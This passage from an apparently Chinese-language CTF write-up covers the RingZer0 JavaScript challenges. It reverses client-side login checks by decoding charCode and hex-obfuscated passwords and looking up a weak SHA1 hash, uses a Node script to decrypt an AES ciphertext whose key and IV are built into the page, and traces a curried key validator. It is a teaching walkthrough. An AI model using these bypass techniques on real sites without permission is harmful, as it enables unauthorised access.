 event.preventDefault()</span><br><span class="line">    <span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">if</span>(u == <span class="string">"admin"</span> &amp;&amp; p == <span class="built_in">String</span>.fromCharCode(<span class="number">74</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">73</span>,<span class="number">115</span>,<span class="number">83</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">101</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>发现一个用户密码的判断。成功登陆即可完成事件。那么我们把密码扔进console转换得到<code>JavaScriptIsSecure</code>.登陆拿flag.</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look's like weak JavaScript auth script :)                                                                          </span></span><br><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">if</span>(Sha1.hash(p) == <span class="string">"b89356ff6151527e89c4f3e3d30c8e6586c63962"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里直接用明确的算法对密码进行加密然后与hash值进行比较。不过注意的是php里常见的0与0e的弱类型比较在js中是不会出现的（但是可能会出现其他弱类型问题）</p><p>所以直接去网上找得到<code>adminz</code>弱密码。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>一个典型的混淆。同样也是典型的解法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0xc360=[<span class="string">"\x76\x61\x6C"</span>,<span class="string">"\x23\x63\x70\x61\x73\x73"</span>,<span class="string">"\x61\x6C\x6B\x33"</span>,<span class="string">"\x30\x32\x6C\x31"</span>,<span class="string">"\x3F\x70\x3D"</span>,<span class="string">"\x69\x6E\x64\x65\x78\x4F\x66"</span>,<span class="string">"\x68\x72\x65\x66"</span>,<span class="string">"\x6C\x6F\x63\x61\x74\x69\x6F\x6E"</span>,<span class="string">"\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E"</span>,<span class="string">"\x68\x74\x6D\x6C"</span>,<span class="string">"\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65"</span>,<span class="string">"\x63\x6C\x69\x63\x6B"</span>,<span class="string">"\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"</span>];$(_0xc360[<span class="number">12</span>])[_0xc360[<span class="number">11</span>]](<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0xf382x1=$(_0xc360[<span class="number">1</span>])[_0xc360[<span class="number">0</span>]]();<span class="keyword">var</span> _0xf382x2=_0xc360[<span class="number">2</span>];<span class="keyword">if</span>(_0xf382x1==_0xc360[<span class="number">3</span>]+_0xf382x2)&#123;<span class="keyword">if</span>(<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]][_0xc360[<span class="number">5</span>]](_0xc360[<span class="number">4</span>])==<span class="number">-1</span>)&#123;<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]]=<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]]+_0xc360[<span class="number">4</span>]+_0xf382x1;&#125; ;&#125; <span class="keyword">else</span> &#123;$(_0xc360[<span class="number">10</span>])[_0xc360[<span class="number">9</span>]](_0xc360[<span class="number">8</span>]);&#125; ;&#125; );</span><br></pre></td></tr></table></figure><p>我个人习惯是用这个<a href="https://lelinhtinh.github.io/de4js/" target="_blank" rel="noopener">网站</a>先去一层混淆。然后再来看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0xc360 = [<span class="string">"val"</span>, <span class="string">"#cpass"</span>, <span class="string">"alk3"</span>, <span class="string">"02l1"</span>, <span class="string">"?p="</span>, <span class="string">"indexOf"</span>, <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"&lt;div class=\'error\'&gt;Wrong password sorry.&lt;/div&gt;"</span>, <span class="string">"html"</span>, <span class="string">"#cresponse"</span>, <span class="string">"click"</span>, <span class="string">".c_submit"</span>];</span><br><span class="line">$(_0xc360[<span class="number">12</span>])[_0xc360[<span class="number">11</span>]](<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0xf382x1 = $(_0xc360[<span class="number">1</span>])[_0xc360[<span class="number">0</span>]]();</span><br><span class="line">    <span class="keyword">var</span> _0xf382x2 = _0xc360[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (_0xf382x1 == _0xc360[<span class="number">3</span>] + _0xf382x2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]][_0xc360[<span class="number">5</span>]](_0xc360[<span class="number">4</span>]) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]] = <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]] + _0xc360[<span class="number">4</span>] + _0xf382x1;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(_0xc360[<span class="number">10</span>])[_0xc360[<span class="number">9</span>]](_0xc360[<span class="number">8</span>]);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其实还可以进一步去混淆。但是我并没有找到太好的网站。所以选择直接看。不难发现if语句及前面一行的内容是<code>var _0xf382x2 = &#39;alk3&#39;; if(_0xf382x1 == &#39;02l1&#39; + _0xf382x2  )</code> 很清晰的表明了验证方式及密码<code>02l1alk3</code></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">var</span> k = CryptoJS.SHA256(<span class="string">"\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37"</span>);</span><br><span class="line">    <span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> t = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(u == <span class="string">"\x68\x34\x78\x30\x72"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!CryptoJS.AES.encrypt(p, CryptoJS.enc.Hex.parse(k.toString().substring(<span class="number">0</span>,<span class="number">32</span>)), &#123; <span class="attr">iv</span>: CryptoJS.enc.Hex.parse(k.toString().substring(<span class="number">32</span>,<span class="number">64</span>)) &#125;) == <span class="string">"ob1xQz5ms9hRkPTx+ZHbVg=="</span>) &#123;</span><br><span class="line">            t = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">            t = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(t) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里就开始使用了算法进行处理了。不过我们可以清晰的看到。user只做了一个16进制的简单显示避免直观。而pass在iv已知的情况下进行aes算法的密文比较。所以我们可以直接解出pass.</p><p>写个node脚本转换下密码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cryptojs = <span class="built_in">require</span>(<span class="string">"crypto-js"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> k = cryptojs.SHA256(<span class="string">"\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37"</span>);</span><br><span class="line"><span class="keyword">let</span> key = cryptojs.enc.Hex.parse(k.toString().substring(<span class="number">0</span>,<span class="number">32</span>));</span><br><span class="line"><span class="keyword">let</span> iv = cryptojs.enc.Hex.parse(k.toString().substring(<span class="number">32</span>,<span class="number">64</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> encrypted = <span class="string">"ob1xQz5ms9hRkPTx+ZHbVg=="</span>;</span><br><span class="line"><span class="keyword">let</span> p =cryptojs.AES.decrypt(encrypted,key,&#123;<span class="attr">iv</span>:iv&#125;);</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">hex_to_ascii</span>(<span class="params">str1</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> hex  = str1.toString();  </span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">''</span>;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; hex.length; n += <span class="number">2</span>) &#123;  </span><br><span class="line">        str += <span class="built_in">String</span>.fromCharCode(<span class="built_in">parseInt</span>(hex.substr(n, <span class="number">2</span>), <span class="number">16</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">console</span>.log(str); </span><br><span class="line">&#125; )(p);</span><br></pre></td></tr></table></figure><p>运行得到<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/0.PNG" alt><br>加上用户名扔进console其实就是h4x0r。所以即可登录拿flag.</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params"> orig_func </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ap = <span class="built_in">Array</span>.prototype, args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        ap.push.apply( fn.args, <span class="built_in">arguments</span> ); </span><br><span class="line">        <span class="keyword">return</span> fn.args.length &lt; orig_func.length ? fn : orig_func.apply( <span class="keyword">this</span>, fn.args );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fn.args = ap.slice.call( args, <span class="number">1</span> );</span><br><span class="line">        <span class="keyword">return</span> fn.apply( <span class="keyword">this</span>, <span class="built_in">arguments</span> );</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">x,y,i,a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !y.call(x, a[a[<span class="string">"length"</span>]<span class="number">-1</span>-i].toString().slice(<span class="number">19</span>,<span class="number">21</span>)) ? x : &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ref = &#123;<span class="attr">T</span> : <span class="string">"BG8"</span>,<span class="attr">J</span> : <span class="string">"jep"</span>,<span class="attr">j</span> : <span class="string">"M2L"</span>,<span class="attr">K</span> : <span class="string">"L23"</span>,<span class="attr">H</span> : <span class="string">"r1A"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validatekey</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> _strKey = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _strKey = <span class="built_in">document</span>.getElementById(<span class="string">"key"</span>).value;</span><br><span class="line">        <span class="keyword">var</span> a = _strKey.split(<span class="string">"-"</span>);</span><br><span class="line">        <span class="keyword">if</span>(a.length !== <span class="number">5</span>)</span><br><span class="line">            e = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> o=a.map(genFunc).reduceRight(callback, <span class="keyword">new</span> (genFunc(a[<span class="number">4</span>]))(<span class="built_in">Function</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!equal(o,ref))</span><br><span class="line">            e = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        e = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!e) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + _strKey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">equal</span>(<span class="params">o,o1</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> keys1 = <span class="built_in">Object</span>.keys(o1);</span><br><span class="line">    <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(o);</span><br><span class="line">    <span class="keyword">if</span>(keys1.length != keys.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;keys.length;i++)</span><br><span class="line">        <span class="keyword">if</span>(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook</span>(<span class="params">f1,f2,f3</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> f2(f1(x),f3(x));&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> h = curry(hook);</span><br><span class="line"><span class="keyword">var</span> fn = h(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;<span class="keyword">return</span> x &gt;= <span class="number">48</span>;&#125;,<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"return a &amp;&amp; b;"</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genFunc</span>(<span class="params">_part</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!_part || !(_part.length) || _part.length !== <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(_part.substring(<span class="number">1</span>,<span class="number">3</span>), <span class="string">"this."</span> + _part[<span class="number">3</span>] + <span class="string">"="</span> + _part.slice(<span class="number">1</span>,<span class="number">3</span>) + <span class="string">"+"</span> + (fn(<span class="function"><span class="keyword">function</span>(<span class="params">y</span>)</span>&#123;<span class="keyword">return</span> y&lt;=<span class="number">57</span>&#125;)(_part.charCodeAt(<span class="number">0</span>)) ?  _part[<span class="number">0</span>] : <span class="string">"'"</span>+ _part[<span class="number">0</span>] + <span class="string">"'"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题开始难度就上升了。我们先慢慢审计代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validatekey</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> _strKey = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _strKey = <span class="built_in">document</span>.getElementById(<span class="string">"key"</span>).value;</span><br><span class="line">        <span class="keyword">var</span> a = _strKey.split(<span class="string">"-"</span>);</span><br><span class="line">        <span class="keyword">if</span>(a.length !== <span class="number">5</span>)</span><br><span class="line">            e = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> o=a.map(genFunc).reduceRight(callback, <span class="keyword">new</span> (genFunc(a[<span class="number">4</span>]))(<span class="built_in">Function</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!equal(o,ref))</span><br><span class="line">            e = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        e = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!e) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + _strKey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里取了页面中key值（即输入）进行一系列判断。只有e为false时我们才能进入<code>document.location = document.location.href + &quot;?p=&quot; + _strKey;</code> 注意到其中主要要求是<code>var a = _strKey.split(&quot;-&quot;);        if(a.length !== 5)......</code> 所以我们需要一个格式为<code>xxx-xxx-xxx-xxx-xxx</code>的key.</p><p>接下来看其他函数。这里的<code>curry()</code>是一个很有意思的js柯里化的函数( 为什么不是库里233) 。常用于多参函数复用并且与callback相结合。不过我们不必深究,先来看逻辑。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> h = curry(hook);</span><br><span class="line"><span class="keyword">var</span> fn = h(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;<span class="keyword">return</span> x &gt;= <span class="number">48</span>;&#125;,<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"return a &amp;&amp; b;"</span>));</span><br></pre></td></tr></table></figure><p>首先是这里。出现了一个<code>x&gt;=48</code>，但是我们不知道x参数从哪里来。所以继续向下看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(_part.substring(<span class="number">1</span>,<span class="number">3</span>), <span class="string">"this."</span> + _part[<span class="number">3</span>] + <span class="string">"="</span> + _part.slice(<span class="number">1</span>,<span class="number">3</span>) + <span class="string">"+"</span> + (fn(<span class="function"><span class="keyword">function</span>(<span class="params">y</span>)</span>&#123;<span class="keyword">return</span> y&lt;=<span class="number">57</span>&#125;)(_part.charCodeAt(<span class="number">0</span>)) ?  _part[<span class="number">0</span>] : <span class="string">"'"</span>+ _part[<span class="number">0</span>] + <span class="string">"'"</span>));</span><br></pre></td></tr></table></figure><p><code>(fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ?  _part[0] : &quot;&#39;&quot;+ _part[0] + &quot;&#39;&quot;)</code>这一部分说明其返回的是函数输入的第一个字符。看到这个IIFE的调用以及前面我们fn函数的构造。可以得出，这里对我们输入的第1个字符进行了比较，其ascii值应该在48到57之间（即数字）就直接取数字，否则就加上<code>&#39;&#39;</code> 简单的调用下我们就可以看出来<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/1.PNG" alt><br>而这个整体是与<code>_part.substring(1,3)</code>作为参数被送进构造函数的。发现他是在key的检查里被调用了<code>var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));</code><br>我们回头看下callback函数的定义以及reduceRight函数的功能</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">x,y,i,a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !y.call(x, a[a[<span class="string">"length"</span>]<span class="number">-1</span>-i].toString().slice(<span class="number">19</span>,<span class="number">21</span>)) ? x : &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reduceRight() 方法接受一个函数作为累加器（accumulator）和数组的每个值（从右到左）将其减少为单个值。</span><br></pre></td></tr></table></figure><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight</a><br>参考上面的文档我们知道，callback作为回调函数，用于操作数组中的每个元素，而我们传入的a[4]生成的函数是数组最右的起点。之后依次向左进行处理。</p><p>这里我尽量作完整的解释。首先callback中<code>a[&quot;length&quot;]-1-i</code>对应的是<code>a.length-1-i</code>即<code>5-1-i</code>=<code>4-i</code>.然后callback函数的四个参数分别对应了空map，构造函数，叠加器的趟数，以及被处理过的输入a（从<code>xxxx-xxxx-xxxx-xxxx-xxxx</code> 变成一个5元素的数组）我们简单调用下,会发现最终返回的结果中每个数组元素的第二，三个会不变，并变成新的map中对应值的第一二位。然后值的最后一位会变成原来输入数组的逆序第一位的第一个字母。而整个返回的map键名是原输入数组逆序的最后一个字母。</p><p>多说无益。我们用一个四元素的数组来看看返回结果<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/2.PNG" alt><br>可以看到，返回的map表中第一个元素键名来自原来数组最后一个元素<code>mnop</code>的最后一个字母。值部分<code>bc</code>保持不变，最后一个字母则是<code>mnop</code>的第一个字母<code>m</code>.</p><p>既然我们需要满足输入key处理后为<code>{T : &quot;BG8&quot;,J : &quot;jep&quot;,j : &quot;M2L&quot;,K : &quot;L23&quot;,H : &quot;r1A&quot;};</code> 写个脚本处理下即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> src = <span class="string">'abcd-efgh-ijkl-mnop-qrst'</span>;</span><br><span class="line"><span class="keyword">var</span> dst = <span class="string">'tbcq-pfgm-ljki-hnoe-drsa'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span 